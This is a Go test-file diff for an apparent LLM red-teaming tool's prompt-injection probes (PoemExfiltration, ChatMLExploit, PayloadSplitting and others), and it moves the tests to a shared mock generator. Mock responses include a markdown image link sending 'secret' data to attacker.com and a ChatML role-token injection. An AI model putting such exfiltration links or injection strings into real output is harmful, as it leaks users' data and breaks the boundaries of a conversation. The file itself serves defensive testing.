@@ -8,32 +8,10 @@ import (
 	"github.com/stretchr/testify/assert"
 	"github.com/stretchr/testify/require"
 
-	"github.com/praetorian-inc/augustus/pkg/attempt"
+	"github.com/praetorian-inc/augustus/internal/testutil"
 	"github.com/praetorian-inc/augustus/pkg/probes"
 	"github.com/praetorian-inc/augustus/pkg/registry"
 )
-
-// mockGenerator implements probes.Generator for testing.
-type mockGenerator struct {
-	name      string
-	responses []string
-	calls     int
-}
-
-func (m *mockGenerator) Generate(_ context.Context, conv *attempt.Conversation, n int) ([]attempt.Message, error) {
-	m.calls++
-	msgs := make([]attempt.Message, n)
-	for i := 0; i < n; i++ {
-		resp := ""
-		if i < len(m.responses) {
-			resp = m.responses[i]
-		}
-		msgs[i] = attempt.Message{Content: resp}
-	}
-	return msgs, nil
-}
-
-func (m *mockGenerator) ClearHistory() {}
 
 // ========== WhoIsRiley Tests ==========
 
@@ -42,14 +20,6 @@ func TestWhoIsRiley_Registration(t *testing.T) {
 	factory, ok := probes.Get("goodside.WhoIsRiley")
 	require.True(t, ok, "goodside.WhoIsRiley should be registered")
 	require.NotNil(t, factory, "factory should not be nil")
-}
-
-func (m *mockGenerator) Name() string {
-	return "mock-generator"
-}
-
-func (m *mockGenerator) Description() string {
-	return "mock generator for testing"
 }
 
 // TestWhoIsRiley_Create verifies the probe can be instantiated.
@@ -165,7 +135,7 @@ func TestWhoIsRiley_Probe_ReturnsAttempts(t *testing.T) {
 	p, err := probes.Create("goodside.WhoIsRiley", nil)
 	require.NoError(t, err)
 
-	gen := &mockGenerator{name: "TestModel", responses: []string{"Riley is a Canadian singer"}}
+	gen := &testutil.MockGenerator{GenName: "TestModel", Responses: []string{"Riley is a Canadian singer"}}
 	ctx := context.Background()
 
 	attempts, err := p.Probe(ctx, gen)
@@ -181,7 +151,7 @@ func TestWhoIsRiley_Probe_AttemptsHaveCorrectMetadata(t *testing.T) {
 	p, err := probes.Create("goodside.WhoIsRiley", nil)
 	require.NoError(t, err)
 
-	gen := &mockGenerator{name: "TestModel", responses: []string{"Riley is a singer"}}
+	gen := &testutil.MockGenerator{GenName: "TestModel", Responses: []string{"Riley is a singer"}}
 	ctx := context.Background()
 
 	attempts, err := p.Probe(ctx, gen)
@@ -335,7 +305,7 @@ func TestThreatenJSON_Probe_ReturnsAttempts(t *testing.T) {
 	p, err := probes.Create("goodside.ThreatenJSON", nil)
 	require.NoError(t, err)
 
-	gen := &mockGenerator{name: "TestModel", responses: []string{`{"key1": "value1", "key2": "value2"}`}}
+	gen := &testutil.MockGenerator{GenName: "TestModel", Responses: []string{`{"key1": "value1", "key2": "value2"}`}}
 	ctx := context.Background()
 
 	attempts, err := p.Probe(ctx, gen)
@@ -351,7 +321,7 @@ func TestThreatenJSON_Probe_AttemptsHaveCorrectMetadata(t *testing.T) {
 	p, err := probes.Create("goodside.ThreatenJSON", nil)
 	require.NoError(t, err)
 
-	gen := &mockGenerator{name: "TestModel", responses: []string{`{"key": "value"}`}}
+	gen := &testutil.MockGenerator{GenName: "TestModel", Responses: []string{`{"key": "value"}`}}
 	ctx := context.Background()
 
 	attempts, err := p.Probe(ctx, gen)
@@ -467,7 +437,7 @@ func TestPoemExfiltration_Probe_ReturnsAttempts(t *testing.T) {
 	p, err := probes.Create("goodside.PoemExfiltration", nil)
 	require.NoError(t, err)
 
-	gen := &mockGenerator{name: "TestModel", responses: []string{"![poem](http://attacker.com/exfil?data=secret)"}}
+	gen := &testutil.MockGenerator{GenName: "TestModel", Responses: []string{"![poem](http://attacker.com/exfil?data=secret)"}}
 	ctx := context.Background()
 
 	attempts, err := p.Probe(ctx, gen)
@@ -482,7 +452,7 @@ func TestPoemExfiltration_Probe_AttemptsHaveCorrectMetadata(t *testing.T) {
 	p, err := probes.Create("goodside.PoemExfiltration", nil)
 	require.NoError(t, err)
 
-	gen := &mockGenerator{name: "TestModel", responses: []string{"test response"}}
+	gen := &testutil.MockGenerator{GenName: "TestModel", Responses: []string{"test response"}}
 	ctx := context.Background()
 
 	attempts, err := p.Probe(ctx, gen)
@@ -586,7 +556,7 @@ func TestPayloadSplitting_Probe_ReturnsAttempts(t *testing.T) {
 	p, err := probes.Create("goodside.PayloadSplitting", nil)
 	require.NoError(t, err)
 
-	gen := &mockGenerator{name: "TestModel", responses: []string{"test response"}}
+	gen := &testutil.MockGenerator{GenName: "TestModel", Responses: []string{"test response"}}
 	ctx := context.Background()
 
 	attempts, err := p.Probe(ctx, gen)
@@ -601,7 +571,7 @@ func TestPayloadSplitting_Probe_AttemptsHaveCorrectMetadata(t *testing.T) {
 	p, err := probes.Create("goodside.PayloadSplitting", nil)
 	require.NoError(t, err)
 
-	gen := &mockGenerator{name: "TestModel", responses: []string{"test response"}}
+	gen := &testutil.MockGenerator{GenName: "TestModel", Responses: []string{"test response"}}
 	ctx := context.Background()
 
 	attempts, err := p.Probe(ctx, gen)
@@ -706,7 +676,7 @@ func TestChatMLExploit_Probe_ReturnsAttempts(t *testing.T) {
 	p, err := probes.Create("goodside.ChatMLExploit", nil)
 	require.NoError(t, err)
 
-	gen := &mockGenerator{name: "TestModel", responses: []string{"<|assistant|> test response"}}
+	gen := &testutil.MockGenerator{GenName: "TestModel", Responses: []string{"<|assistant|> test response"}}
 	ctx := context.Background()
 
 	attempts, err := p.Probe(ctx, gen)
@@ -721,7 +691,7 @@ func TestChatMLExploit_Probe_AttemptsHaveCorrectMetadata(t *testing.T) {
 	p, err := probes.Create("goodside.ChatMLExploit", nil)
 	require.NoError(t, err)
 
-	gen := &mockGenerator{name: "TestModel", responses: []string{"test response"}}
+	gen := &testutil.MockGenerator{GenName: "TestModel", Responses: []string{"test response"}}
 	ctx := context.Background()
 
 	attempts, err := p.Probe(ctx, gen)
@@ -827,7 +797,7 @@ func TestSystemPromptConfusion_Probe_ReturnsAttempts(t *testing.T) {
 	p, err := probes.Create("goodside.SystemPromptConfusion", nil)
 	require.NoError(t, err)
 
-	gen := &mockGenerator{name: "TestModel", responses: []string{"test response"}}
+	gen := &testutil.MockGenerator{GenName: "TestModel", Responses: []string{"test response"}}
 	ctx := context.Background()
 
 	attempts, err := p.Probe(ctx, gen)
@@ -842,7 +812,7 @@ func TestSystemPromptConfusion_Probe_AttemptsHaveCorrectMetadata(t *testing.T) {
 	p, err := probes.Create("goodside.SystemPromptConfusion", nil)
 	require.NoError(t, err)
 
-	gen := &mockGenerator{name: "TestModel", responses: []string{"test response"}}
+	gen := &testutil.MockGenerator{GenName: "TestModel", Responses: []string{"test response"}}
 	ctx := context.Background()
 
 	attempts, err := p.Probe(ctx, gen)
@@ -948,7 +918,7 @@ func TestAllGoodsideProbes_Probe(t *testing.T) {
 			p, err := probes.Create(probeName, nil)
 			require.NoError(t, err)
 
-			gen := &mockGenerator{name: "TestModel", responses: []string{"test response"}}
+			gen := &testutil.MockGenerator{GenName: "TestModel", Responses: []string{"test response"}}
 			ctx := context.Background()
 
 			attempts, err := p.Probe(ctx, gen)
